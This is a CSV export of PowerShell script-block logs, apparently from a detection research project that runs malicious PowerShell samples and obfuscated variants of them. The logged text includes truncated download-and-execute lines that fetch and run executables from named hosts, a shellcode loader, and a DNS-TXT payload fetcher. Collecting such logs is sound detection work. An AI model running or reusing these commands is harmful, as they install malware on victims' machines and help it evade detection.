"8/6/2026 10:23:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:32 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1671.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1666.ps1","2328","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:16 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1666.ps1","3037"," .( $EnV:coMsPec[4,24,25]-jOIN'') ( (((""{34}{7}{1}{17}{18}{19}{61}{21}{59}{40}{70}{33}{65}{28}{43}{37}{29}{66}{56}{24}{32}{22}{63}{12}{10}{4}{69}{5}{25}{49}{48}{16}{64}{3}{26}{58}{55}{42}{51}{47}{27}{"
"8/6/2026 10:23:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:08 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:08 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1666.ps1","2718"," &( ([StriNG]$veRBOSeprefeREncE)[1,3]+'x'-jOIn'')(('Madc = Yw3[Dll'+'Import(YI7'+'kernel32.dllYI7)]pub'+'lic stat'+'ic extern IntPtr VirtualAll'+'oc(IntPtr lpAddress, uint dwSize'+', uint flAllocation"
"8/6/2026 10:23:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:00 AM","","2323","  $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:23:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1666.ps1","21","{( [iNt]$_-aS[ChaR])}"
"8/6/2026 10:23:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1666.ps1","10250",""" $( sEt-VariabLE  'ofs'  '' ) "" +[stRiNG](( 36, 99 , 32 ,61 , 32 ,39 ,91 ,68 , 108,108 , 73 ,109, 112 ,111 ,114,116, 40 , 34 , 107, 101 , 114, 110, 101, 108 ,51,50 , 46,100 , 108 , 108 , 34, 41 , 93,"
"8/6/2026 10:22:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:52 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1666.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:22:45 AM","","9","$global:?"
"8/6/2026 10:22:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1619.ps1","142","(new-`o`BJecT System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");sTArT-`PR`OCesS (""$env:TEMP\wincat.exe"")
"
"8/6/2026 10:22:37 AM","","9","$global:?"
"8/6/2026 10:22:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:36 AM","","136","(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");Start-Process (""$env:TEMP\wincat.exe"")"
"8/6/2026 10:22:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1619.ps1","469","&((vaRIabLe '*mDR*').nAME[3,11,2]-join'')( (((""{12}{8}{30}{17}{1}{31}{11}{16}{25}{28}{18}{9}{5}{2}{26}{27}{20}{6}{10}{29}{0}{14}{24}{22}{15}{19}{3}{7}{13}{23}{4}{21}"" -f 'e{1}','ebClient).Downlo','jYl"
"8/6/2026 10:22:29 AM","","9","$global:?"
"8/6/2026 10:22:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:28 AM","","136","(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");Start-Process (""$env:TEMP\wincat.exe"")"
"8/6/2026 10:22:28 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1619.ps1","474"," (('('+'New'+'-Obj'+'ect '+'Sys'+'t'+'em.Net.WebClie'+'nt'+').Down'+'l'+'oa'+'dFile'+'(r5'+'Ghttp'+'://rgho'+'.st/6hrkjYl'+'X4r'+'5G,vXaL7Ne'+'nv:TEM'+'P'+'C5c'+'wi'+'n'+'c'+'at.exev'+'Xa'+')'+';Start"
"8/6/2026 10:22:21 AM","","9","$global:?"
"8/6/2026 10:22:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:20 AM","","138"," (New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");Start-Process (""$env:TEMP\wincat.exe"") "
"8/6/2026 10:22:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1619.ps1","22","{([Int]$_-As [cHaR]) }"
"8/6/2026 10:22:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1619.ps1","772"," . ((Gv '*mdr*').NAMe[3,11,2]-jOIN'')( ""$(SEt-iTEM  'VARIaBle:oFS'  '') ""+ [STRing]((40 ,78, 101 , 119 ,45 , 79 , 98, 106,101,99 ,116,32, 83 ,121,115, 116, 101,109, 46 ,78 , 101 , 116 , 46 , 87, 101 ,"
"8/6/2026 10:22:13 AM","","9","$global:?"
"8/6/2026 10:22:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:12 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1619.ps1","136","(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");Start-Process (""$env:TEMP\wincat.exe"")"
"8/6/2026 10:22:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1614.ps1","140","(n`EW-OBJ`eCT System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');starT-`pRO`c`Ess 'fleeble.exe'
"
"8/6/2026 10:21:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:21:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:21:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:21:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:21:56 AM","","133","(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:21:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1614.ps1","467"," ((""{32}{30}{10}{18}{23}{1}{13}{3}{27}{31}{28}{20}{15}{5}{2}{11}{4}{22}{6}{25}{8}{0}{16}{19}{21}{17}{7}{26}{24}{12}{29}{9}{14}"" -f'Dp','.WebClient).Downlo','bf','V','ee.com/','5g','e.','.','VDp,V','eb"
"8/6/2026 10:21:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:21:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:21:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:21:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:21:48 AM","","133","(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:21:48 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1614.ps1","344"," (('(New-Obje'+'ct S'+'ystem.Ne'+'t.'+'We'+'b'+'Clien'+'t).Do'+'wnl'+'oad'+'Fil'+'e(Sv2'+'http:'+'//matk'+'alv.5g'+'bfree.co'+'m/noza'+'/o'+'de'+'ee.'+'exeSv2,Sv'+'2fleeble.e'+'xe'+'Sv2)'+';S'+'tart'+"
"8/6/2026 10:21:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:21:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:21:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:21:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:21:40 AM","","133","(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:21:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1614.ps1","18","{([char] [iNt]$_)}"
"8/6/2026 10:21:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1614.ps1","701","&( ([STRINg]$VErBOsEPREFEReNce)[1,3]+'x'-joIn'')( ( (40 ,78 ,101,119,45 ,79 , 98,106,101 , 99, 116, 32,83 ,121,115 ,116,101, 109,46,78, 101 ,116 , 46 , 87 , 101 ,98 ,67 ,108 , 105,101, 110 , 116,41,46"
"8/6/2026 10:21:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:21:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:21:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:21:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:21:32 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1614.ps1","133","(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:21:24 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:21:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1604.ps1","344","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((I`Ex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$w"
"8/6/2026 10:21:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1604.ps1","2339","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (gEt-w`MI`OB`JECT Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((g`P HKCU:\\Software\Microsoft\Windows\Curr"
"8/6/2026 10:21:16 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:21:16 AM","","342","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws"
"8/6/2026 10:21:16 AM","","2305","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentV"
"8/6/2026 10:21:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1604.ps1","3612"," . ( $SHELLID[1]+$shellId[13]+'x') ( ((""{43}{0}{15}{29}{47}{38}{40}{58}{24}{57}{39}{27}{52}{21}{51}{26}{17}{35}{45}{23}{13}{55}{49}{28}{8}{22}{36}{50}{14}{30}{46}{3}{41}{44}{7}{42}{20}{31}{32}{11}{10}"
"8/6/2026 10:21:08 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:21:08 AM","","342","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws"
"8/6/2026 10:21:08 AM","","2305","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentV"
"8/6/2026 10:21:08 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1604.ps1","3307"," ('r4KLXUnfqnr4K;Rw4ErrorActionPr'+'eference = r4KSilentlyContinuer4K;r4KJlnlr4K;r4KrXrPGggbr4K;Rw4by = (get-wmiobject Win32_ComputerSystemProduct).U'+'UID;r4KkjEvisMrr4K;r4KBlwFKzHgxr4K;if ((gp HKCU:"
"8/6/2026 10:21:00 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:21:00 AM","","342","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws"
"8/6/2026 10:21:00 AM","","2305","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentV"
"8/6/2026 10:20:59 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1604.ps1","10239",". ( $sHeLLID[1]+$SHElLiD[13]+'X') ( -joiN [cHAR[]]( 39,76 ,88,85, 110,102 , 113 ,110 ,39 , 59 ,36,69 , 114 ,114,111 , 114 , 65 , 99 ,116,105, 111 ,110, 80, 114 ,101 , 102,101 ,114,101 , 110,99 ,101 , "
"8/6/2026 10:20:52 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:20:52 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1604.ps1","342","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws"
"8/6/2026 10:20:51 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1604.ps1","2305","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentV"
"8/6/2026 10:20:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1602.ps1","2251","$0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:20:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:35 AM","","2244","$0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:20:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1602.ps1","2980",".( ([STRing]$VErbOsEPreFEreNcE)[1,3]+'X'-jOIn'')((((""{59}{56}{13}{36}{61}{38}{23}{34}{17}{41}{53}{18}{0}{24}{46}{35}{52}{55}{5}{6}{10}{43}{32}{25}{50}{67}{49}{22}{9}{66}{48}{21}{64}{2}{15}{30}{58}{47}"
"8/6/2026 10:20:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:27 AM","","2244","$0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:20:27 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1602.ps1","2696"," (('42v0ab = YaS[Dl'+'lImport(ALMkernel32.dllALM)]public static extern In'+'tPtr VirtualAll'+'oc(IntPtr lpAddress, uint dwSize, uint flAllocationTyp'+'e, uint flProtect);[DllImport(ALMkernel32.dll'+'A"
"8/6/2026 10:20:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:19 AM","","2246"," $0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:20:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1602.ps1","9887",""" $( sET 'oFs' '' )"" +[stRING][chAR[]] (36 ,48 ,97 ,98 ,32, 61,32 , 39,91,68 ,108 ,108 , 73 ,109, 112 ,111, 114,116 ,40 , 34 , 107 , 101 , 114 , 110,101 , 108, 51,50, 46, 100 , 108, 108,34,41 ,93,112,"
"8/6/2026 10:20:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:11 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1602.ps1","2244","$0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:20:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1590.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:55 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1590.ps1","2828"," ((""{9}{40}{39}{29}{36}{5}{44}{25}{4}{34}{15}{37}{6}{12}{46}{11}{1}{8}{43}{20}{41}{31}{10}{19}{24}{14}{13}{21}{2}{7}{16}{33}{30}{35}{18}{0}{26}{38}{27}{3}{45}{28}{17}{32}{42}{22}{23}"" -f'5f,0x5a,0x8b,"
"8/6/2026 10:19:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:47 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:47 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1590.ps1","2627","& ( $eNv:coMsPEC[4,15,25]-jOin'')(('AWEc = '+'3hH[Dl'+'lImport(sw1k'+'ernel32.dllsw1)]public '+'static extern In'+'tPtr VirtualAllo'+'c(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPro"
"8/6/2026 10:19:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:39 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1590.ps1","23","{ ( [Int]$_-AS [cHar])}"
"8/6/2026 10:19:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1590.ps1","9823",".( $sHeLLId[1]+$sheLlid[13]+'X') ([StrIng]::jOIN('' , ((36,99 ,32,61,32,39, 91, 68 ,108, 108 ,73, 109,112 ,111,114,116 ,40, 34, 107,101 ,114, 110 , 101 ,108,51 , 50, 46, 100 , 108, 108, 34 , 41 , 93, "
"8/6/2026 10:19:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:31 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1590.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:23 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
